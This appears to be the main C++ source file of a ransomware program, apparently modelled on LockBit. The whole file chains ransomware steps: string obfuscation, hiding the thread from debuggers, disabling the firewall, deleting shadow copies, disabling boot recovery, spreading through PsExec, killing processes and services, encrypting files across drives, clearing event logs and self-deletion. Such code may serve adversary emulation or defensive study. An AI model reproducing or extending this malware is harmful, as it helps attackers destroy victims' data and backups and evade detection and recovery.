// Prepend buffer to .text section to allow protector utility to overwrite with old entry point
#pragma section(".buffer")
#pragma comment(linker, "/merge:.buffer=.text")
extern "C" __declspec(allocate(".buffer"))
const char buffer[0x10]{ 0x00 };

// For testing
#if defined(USE_CUSTOM_SECTION_STUB) && (USE_CUSTOM_SECTION_STUB == 1)
#pragma section (".testsh", read, execute)
extern "C" __declspec(allocate(".testsh"))
const unsigned char shellcode[]{ 0xcc, 0xc3 }; // int 3 breakpoint, return
#endif

#define WIN32_LEAN_AND_MEAN

#include "argparser.hpp"
#include "base64.hpp"
#include "config.hpp"
#include "crypto/xor_obfuscation.hpp"
#include "defense_evasion.hpp"
#include "discovery.hpp"
#include "enumerate.hpp"
#include "guardrails.hpp"
#include "logger.hpp"
#include "impact.hpp"
#include "propagate.hpp"
#include "tamper.hpp"
#include "util/string_util.hpp"
#include <iostream>
#include <format>
#include <exception>

// to enable stdout logging in plaintext
#ifndef DEBUG_LOGGING
    #define DEBUG_LOGGING false
#endif

#define FAILURE_CLI_ARGS 0x1
#define FAILURE_MUTEX_CHECK 0x2
#define FAILURE_LANG_CHECK 0x3
#define FAILURE_CONFIG_LOAD 0x4

int main(int argc, char* argv[]) {
    std::vector<unsigned char> key = {
        0x5a, 0x52, 0xac, 0x49, 0xe0, 0x70, 0xfb, 0x1b, 0x0a, 0x4e, 0xbb, 0x30, 0xd2, 0x81, 0x21, 0xbe, 
        0x37, 0x65, 0xf4, 0xb7, 0xa4, 0x10, 0x5f, 0xbb, 0xd8, 0xd8, 0xf5, 0x36, 0xa9, 0x5f, 0x07, 0x70, 
        0x72, 0xe2, 0xd4, 0xc8, 0xd2, 0xa2, 0x37, 0x08, 0xee, 0xc2, 0x2e, 0xf2, 0x12, 0x24, 0x68, 0x6d, 
        0x8e, 0x15, 0x80, 0x84, 0xdb, 0x2d, 0x6d, 0x97, 0xb2, 0xc4, 0x9b, 0xc6, 0x87, 0x61, 0x8d, 0x9e,
        0xb3, 0x0e, 0x00, 0xe6, 0x74, 0x7b, 0xeb, 0xce, 0x19, 0x48, 0xb9, 0xaa, 0x4a, 0x28, 0x65, 0xef, 
        0xb8, 0xd5, 0x4d, 0x08, 0x28, 0x42, 0x3a, 0xaf, 0x2f, 0x73, 0xd0, 0xa4, 0x86, 0x6e, 0xe5, 0xee, 
        0xca, 0x94, 0x31, 0x2c, 0x49, 0x02, 0x97, 0x12, 0xff, 0xbd, 0xab, 0x08, 0x6f, 0x9a, 0x09, 0xab, 
        0xfd, 0x73, 0x0c, 0x4d, 0x71, 0x15, 0x56, 0xff, 0x79, 0x7e, 0xd7, 0xef, 0x29, 0xcf, 0xe5, 0x82
    };

    // Initialize logger
    std::string log_path = XOR_LIT("lb.log");
    int init_result = XorLogger::InitializeLogger(log_path, key);
    if (init_result != 0) {
        std::string err_msg = std::format("{}: {}", XOR_LIT("Failed to initialize logger. Error code"), init_result);
        std::cerr << err_msg << std::endl;
        return init_result;
    }

    XorLogger::LogInfo(XOR_LIT("Initialized logger."));

    // Hide main thread from debugger
    try {
        DWORD error_code;
        FP_GetCurrentThread getCurrentThread = (FP_GetCurrentThread)winapi_helper::GetAPI(0xe03908c0, XOR_WIDE_LIT(L"Kernel32.dll"), &error_code);
        if (getCurrentThread == NULL || error_code != ERROR_SUCCESS) {
            throw std::runtime_error(std::format("{}: {}", XOR_LIT("Failed to get address for GetCurrentThread. Error code"), error_code));
        }
        defense_evasion::HideThreadFromDebugger(getCurrentThread());
        XorLogger::LogInfo(XOR_LIT("Hid main thread from debugger."));
    } catch (const std::exception& e) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Caught exception when hiding main thread from debugger"), e.what()));
    } catch (...) {
        XorLogger::LogError(XOR_LIT("Unknown exception when hiding main thread from debugger."));
    }

    // Parse command lines
    ArgParser args(argc, argv);
    args.SetFlag("-d"); // Toggle self-delete
    args.SetStringArg("-pw"); // To pass in the password to decrypt itself
    args.SetStringArg("-path"); // To specify a specific directory to encrypt within
    args.SetFlag("-ps"); // Toggle psexec propagation
    args.SetFlag("-w"); // Toggle wallpaper change
    try {
        args.Parse();
    } catch (const std::exception& e) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Caught exception when parsing command-line args"), e.what()));
        return FAILURE_CLI_ARGS;
    } catch (...) {
        XorLogger::LogError(XOR_LIT("Unknown exception when parsing command-line args."));
        return FAILURE_CLI_ARGS;
    }

    if (args.GetFlag("-d")) {
        XorLogger::LogInfo(XOR_LIT("Enabled self-delete via command-line flag"));
    }

    if (args.GetFlag("-ps")) {
        XorLogger::LogInfo(XOR_LIT("Enabled PsExec propagation via command-line flag."));
    }

    if (args.GetFlag("-w")) {
        XorLogger::LogInfo(XOR_LIT("Enabled wallpaper changes via command-line flag."));
    }

    std::string password = args.GetStringArg("-pw");
    XorLogger::LogInfo(std::format("{}: {}", XOR_LIT("Password from command-line"), password));

    std::string strict_include_path = args.GetStringArg("-path");
    XorLogger::LogInfo(std::format("{}: {}", XOR_LIT("Strict-include path from command-line"), strict_include_path));

    // Perform basic initial discovery
    std::string username = discovery::GetUsername();
    XorLogger::LogInfo(std::format("{}: {}", XOR_LIT("Running as user"), username));

    std::string hostname = discovery::GetHostname();
    XorLogger::LogInfo(std::format("{}: {}", XOR_LIT("Running on host"), hostname));

    std::string domain = discovery::GetDomain();
    XorLogger::LogInfo(std::format("{}: {}", XOR_LIT("Domain"), domain));
    
    std::string arch = discovery::GetOsArchitecture();
    XorLogger::LogInfo(std::format("{}: {}", XOR_LIT("Arch"), arch));

    std::string version = discovery::GetOsVersionString();
    XorLogger::LogInfo(std::format("{}: {}", XOR_LIT("OS Version"), version));

    // Get configuration
    Config cfg;
    try {
        cfg = GetConfig();
    } catch (const std::exception& e) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Caught exception when loading configuration"), e.what()));
        return FAILURE_CONFIG_LOAD;
    } catch (...) {
        XorLogger::LogError(XOR_LIT("Unknown exception when loading configuration."));
        return FAILURE_CONFIG_LOAD;
    }

    // Perform mutex check
    if (cfg.MutexCheckEnabled()) {
        if (!guardrails::CheckCreateMutex(hostname)) {
            XorLogger::LogError(XOR_LIT("Mutex check failed. Terminating early."));
            return FAILURE_MUTEX_CHECK;
        } else {
            XorLogger::LogInfo(XOR_LIT("Mutex check passed."));
        }
    } else {
        XorLogger::LogInfo(XOR_LIT("Skipping mutex check."));
    }

    // Perform language check
    if (cfg.SystemLangCheckEnabled()) {
        if (guardrails::SystemHasExcludedLang(guardrails::GetDefaultLanguageExclusionSet())) {
            XorLogger::LogInfo(XOR_LIT("Current target shall be excluded due to system language. Terminating early."));
            return FAILURE_LANG_CHECK;
        } else {
            XorLogger::LogInfo(XOR_LIT("System language check passed."));
        }
    } else {
        XorLogger::LogInfo(XOR_LIT("Skipping system language check."));
    }

    // Get drives
    std::vector<std::wstring> start_dirs = enumerate::GetLogicalDrives();
    if (start_dirs.empty()) {
        start_dirs.push_back(XOR_WIDE_LIT(L"C:\\"));
    }

    // Disable firewall
    if (cfg.DisableSecurityToolsEnabled()) {
        XorLogger::LogInfo(XOR_LIT("Attempting to disable firewall"));
        try {
            defense_evasion::DisableFirewall();
        } catch (const std::exception& e) {
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("Caught exception when disabling firewall"), e.what()));
        } catch (...) {
            XorLogger::LogError(XOR_LIT("Unknown exception when disabling firewall."));
        }
    }

    // Delete shadow copies
    if (cfg.ShadowCopyDeletionEnabled()) {
        try {
            XorLogger::LogInfo(XOR_LIT("Attempting to delete shadow copies."));
            tamper::DeleteShadowCopies();
        } catch (const std::exception& e) {
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("Caught exception when deleting shadow copies"), e.what()));
        } catch (...) {
            XorLogger::LogError(XOR_LIT("Unknown exception when deleting shadow copies."));
        }
    } else {
        XorLogger::LogInfo(XOR_LIT("Skipping shadow copy deletion."));
    }

    // Disable boot recovery
    if (cfg.DisableBootRecoveryEnabled()) {
        XorLogger::LogInfo(XOR_LIT("Disabling boot recovery via bcdedit."));
        try {
            tamper::DisableBootRecovery();
        } catch (const std::exception& e) {
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("Caught exception when disabling boot recovery"), e.what()));
        } catch (...) {
            XorLogger::LogError(XOR_LIT("Unknown exception when disabling boot recovery."));
        }
    } else {
        XorLogger::LogInfo(XOR_LIT("Skipping boot recovery tampering."));
    }

    // Ping local targets and propagate via PsExec if specified via config or command-line arg
    if (cfg.PropagationEnabled() || args.GetFlag("-ps")) {
        XorLogger::LogInfo(XOR_LIT("Performing remote host discovery and PsExec propagation."));
        try {
            propagate::PerformPsExecPropagation(cfg, string_util::string_to_wstring(password));
        } catch (const std::exception& e) {
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("Caught exception when performing remote host discovery and PsExec propagation"), e.what()));
        } catch (...) {
            XorLogger::LogError(XOR_LIT("Unknown exception when performing remote host discovery and PsExec propagation."));
        }
    } else {
        XorLogger::LogInfo(XOR_LIT("Skipping remote host discovery and PsExec propagation."));
    }

    // Kill processes
    if (cfg.ProcessTerminationEnabled()) {
        XorLogger::LogInfo(XOR_LIT("Terminating target processes."));
        tamper::KillProcesses(cfg.GetHashedTargetProcesses());
    } else {
        XorLogger::LogInfo(XOR_LIT("Skipping terminating target processes."));
    }

    // Terminate and disable services
    if (cfg.ServiceTerminationEnabled()) {
        XorLogger::LogInfo(XOR_LIT("Stopping and disabling target services."));
        tamper::TerminateAndDisableServices(cfg.GetTargetServices());
    } else {
        XorLogger::LogInfo(XOR_LIT("Skipping stopping and disabling target services."));
    }

    // Clear recycle bin
    if (cfg.EmptyRecycleBinEnabled()) {
        XorLogger::LogInfo(XOR_LIT("Attempting to clear recycle bin."));
        try {
            if (impact::ClearRecycleBin()) {
                XorLogger::LogInfo(XOR_LIT("Cleared recycle bin."));
            } else{
                XorLogger::LogError(XOR_LIT("Failed to clear recycle bin."));
            }
        } catch (const std::exception& e) {
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("Caught exception when clearing recycle bin"), e.what()));
        } catch (...) {
            XorLogger::LogError(XOR_LIT("Unknown exception when clearing recycle bin."));
        }
    } else {
        XorLogger::LogInfo(XOR_LIT("Skipping clearing recycle bin."));
    }

    // Set encrypted file icon
    if (cfg.IconChangeEnabled()) {
        try {
            if (!impact::SetEncryptedFileIcon(cfg.GetExtension())) {
                XorLogger::LogError(XOR_LIT("Failed to set encrypted file icon."));
            } else {
                XorLogger::LogInfo(XOR_LIT("Set encrypted file icon."));
            }
        } catch (const std::exception& e) {
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("Caught exception when setting encrypted file icon"), e.what()));
        } catch (...) {
            XorLogger::LogError(XOR_LIT("Unknown exception when setting encrypted file icon."));
        }
    } else {
        XorLogger::LogInfo(XOR_LIT("Skipping setting encrypted file icon."));
    }

    // Save session keys in registry
    try {
        impact::StoreRsaSessionKeys(cfg);
        XorLogger::LogInfo(XOR_LIT("Stored RSA session keys in registry."));
    } catch (const std::exception& e) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Caught exception when storing RSA session keys"), e.what()));
    } catch (...) {
        XorLogger::LogError(XOR_LIT("Unknown exception when storing RSA session keys."));
    }

    // Enumerate and encrypt files
    if (cfg.EnumerationEnabled()) {
        try {
            if (!strict_include_path.empty()) {
                start_dirs = { string_util::string_to_wstring(strict_include_path) };
                XorLogger::LogInfo(std::format(
                    "{} {}",
                    XOR_LIT("Limiting enumeration/encryption to strict include path:"), 
                    strict_include_path
                ));
            }
            if (cfg.EncryptionEnabled()) {
                XorLogger::LogInfo(XOR_LIT("Enumerating and encrypting files"));
                enumerate::EnumerateAndEncrypt(cfg, start_dirs, false, LB_ENCRYPT_FILES);
                XorLogger::LogInfo(XOR_LIT("Finished enumerating and encrypting files."));
            } else {
                XorLogger::LogInfo(XOR_LIT("Enumerating (not encrypting) files"));
                enumerate::EnumerateAndEncrypt(cfg, start_dirs, false, LB_ENUMERATE_ONLY);
                XorLogger::LogInfo(XOR_LIT("Finished enumerating files."));
            }
        } catch (const std::exception& e) {
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("Caught exception when enumerating/encrypting files"), e.what()));
        } catch (...) {
            XorLogger::LogError(XOR_LIT("Unknown exception when enumerating/encrypting files."));
        }
    } else {
        XorLogger::LogInfo(XOR_LIT("Skipping file enumeration/encryption."));
    }
    
    // Change wallpaper
    if (cfg.WallpaperChangeEnabled() || args.GetFlag("-w")) {
        try {
            if (!impact::ChangeWallPaper(cfg.GetExtension() + L".bmp")) {
                XorLogger::LogError(XOR_LIT("Failed to change wallpaper."));
            } else {
                XorLogger::LogInfo(XOR_LIT("Changed wallpaper."));
            }
        } catch (const std::exception& e) {
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("Caught exception when changing wallpaper"), e.what()));
        } catch (...) {
            XorLogger::LogError(XOR_LIT("Unknown exception when changing wallpaper."));
        }
    } else {
        XorLogger::LogInfo(XOR_LIT("Skipping wallpaper change."));
    }

    // Clear and disable Event logs
    if (cfg.EventLogDeletionEnabled()) {
        try {
            XorLogger::LogInfo(XOR_LIT("Attempting to clear and disable event logs."));
            tamper::ClearAndDisableEventLogs();
        } catch (const std::exception& e) {
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("Caught exception when clearing and disabling event logs"), e.what()));
        } catch (...) {
            XorLogger::LogError(XOR_LIT("Unknown exception when clearing and disabling event logs."));
        }
    } else {
        XorLogger::LogInfo(XOR_LIT("Skipping event log deletion."));
    }

    // Self destruct, if enabled
    if (cfg.SelfDeleteEnabled() || args.GetFlag("-d")) {
        XorLogger::LogInfo(XOR_LIT("Performing self-destruction."));
        try {
            defense_evasion::SelfDestruct();
        } catch (const std::exception& e) {
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("Caught exception when performing self destruct"), e.what()));
        } catch (...) {
            XorLogger::LogError(XOR_LIT("Unknown exception when performing self destruct."));
        }
    } else {
        XorLogger::LogInfo(XOR_LIT("Self-destruction not enabled in config or via command-line arg. Skipping."));
        guardrails::ReleaseMutex();
        XorLogger::CloseLogger();
    }

    return 0;
}